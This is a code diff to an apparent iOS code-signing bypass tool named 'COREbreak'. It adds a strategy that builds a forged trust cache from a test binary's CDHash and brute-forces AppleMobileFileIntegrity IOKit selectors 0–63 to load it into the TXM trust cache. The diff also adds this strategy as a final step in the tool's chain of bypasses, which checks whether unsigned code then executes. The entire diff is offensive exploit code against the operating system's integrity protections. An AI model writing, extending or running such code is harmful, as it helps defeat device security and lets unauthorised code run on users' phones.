@@ -8,6 +8,8 @@
 #import "../kexploit/kexploit_opa334.h"
 
 #import <dlfcn.h>
+#import <IOKit/IOKitLib.h>
+#import <CommonCrypto/CommonDigest.h>
 #ifndef kCacheFunctionPrepare
 #define kCacheFunctionPrepare 1
 #endif
@@ -430,6 +432,109 @@ bool coretrust_kill_amfid_race(const char *testBinPath)
 }
 
 // ===========================================================================
+// Strategy 6: TXM bypass via extended AMFI IOKit brute-force
+// ===========================================================================
+// TXM (Trusted Execution Module) on A18+ maintains a separate hardware
+// trust cache independent of AMFI's software trust cache.  The AMFI IOKit
+// user client exposes multiple selectors — some load into AMFI's cache
+// (0-15), others load into TXM's cache.  We brute-force selectors 0-63
+// with both IOConnectCallStructMethod and IOConnectCallMethod to find the
+// TXM loader.
+//
+// This is distinct from strategy 4 (MountCache) which only tries AMFI
+// selectors 0-15 with IOConnectCallStructMethod.
+// ===========================================================================
+
+bool coretrust_txm_bypass(void)
+{
+    printf("[COREbreak] === [Strategy 6] TXM bypass via AMFI IOKit brute-force ===\n");
+    crash_write("[COREbreak] Strategy 6: TXM bypass\n");
+
+    const char *testPath = g_test_binary_path[0] ? g_test_binary_path : NULL;
+    if (!testPath) {
+        printf("[COREbreak] no test binary path\n");
+        return false;
+    }
+
+    // Compute CDHash
+    uint8_t *cdhash = msm_compute_cdhash(testPath);
+    if (!cdhash) {
+        printf("[COREbreak] CDHash computation failed\n");
+        return false;
+    }
+
+    // Build trust cache module
+    size_t tcSize = 0;
+    uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, &tcSize);
+    free(cdhash);
+    if (!tcData) {
+        printf("[COREbreak] trust cache build failed\n");
+        return false;
+    }
+
+    // Open AMFI IOKit service
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("AppleMobileFileIntegrity"));
+    if (!service) {
+        printf("[COREbreak] AMFI IOKit service not found\n");
+        free(tcData);
+        return false;
+    }
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) {
+        printf("[COREbreak] IOServiceOpen failed: 0x%x\n", kr);
+        IOObjectRelease(service);
+        free(tcData);
+        return false;
+    }
+
+    printf("[COREbreak] AMFI IOKit opened (conn=0x%x)\n", conn);
+
+    bool loaded = false;
+
+    // Phase 1: IOConnectCallStructMethod, selectors 0-63
+    printf("[COREbreak] Phase 1: IOConnectCallStructMethod [0-63]...\n");
+    for (uint32_t sel = 0; sel < 64 && !loaded; sel++) {
+        size_t outSize = sizeof(uint32_t);
+        uint32_t outVal = 0;
+        kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, &outVal, &outSize);
+        if (kr == KERN_SUCCESS) {
+            printf("[COREbreak] TXM TC loaded via StructMethod selector %u!\n", sel);
+            crash_write("[COREbreak] TXM TC loaded via StructMethod\n");
+            loaded = true;
+        }
+    }
+
+    // Phase 2: IOConnectCallMethod, selectors 0-63
+    if (!loaded) {
+        printf("[COREbreak] Phase 2: IOConnectCallMethod [0-63]...\n");
+        for (uint32_t sel = 0; sel < 64 && !loaded; sel++) {
+            size_t outSize = sizeof(uint32_t);
+            uint32_t outVal = 0;
+            kr = IOConnectCallMethod(conn, sel, NULL, 0, tcData, tcSize,
+                                     NULL, NULL, &outVal, &outSize);
+            if (kr == KERN_SUCCESS) {
+                printf("[COREbreak] TXM TC loaded via CallMethod selector %u!\n", sel);
+                crash_write("[COREbreak] TXM TC loaded via CallMethod\n");
+                loaded = true;
+            }
+        }
+    }
+
+    IOServiceClose(conn);
+    IOObjectRelease(service);
+    free(tcData);
+
+    if (!loaded) {
+        printf("[COREbreak] TXM bypass: no selector worked\n");
+    }
+
+    return loaded;
+}
+
+// ===========================================================================
 // Unified: try all strategies
 // ===========================================================================
 
@@ -486,11 +591,24 @@ bool coretrust_bypass_all(void)
         return true;
     }
 
-    // [Step 4/4]: MountCache trust cache injection
+    // [Step 4/4]: MountCache trust cache injection (AMFI software TC)
     printf("[COREbreak] [Step 4/4] MountCache trust cache injection...\n");
     if (msm_verify_unsigned_execution()) {
-        printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache!\n");
+        printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache (AMFI)!\n");
         return true;
+    }
+
+    // [Step 5/5]: Strategy 6 — TXM bypass (hardware trust cache)
+    printf("[COREbreak] [Step 5/5] TXM bypass via extended IOKit brute-force...\n");
+    crash_write("[COREbreak] Step 5/5: TXM bypass\n");
+    if (coretrust_txm_bypass()) {
+        if (verify()) {
+            printf("[COREbreak] ✅✅✅ Unsigned code executed via TXM bypass!\n");
+            crash_write("[COREbreak] TXM bypass: SUCCESS\n");
+            return true;
+        }
+        printf("[COREbreak] TXM TC loaded but verification failed\n");
+        crash_write("[COREbreak] TXM bypass: TC loaded but verify failed\n");
     }
 
     printf("[COREbreak] All strategies exhausted\n");
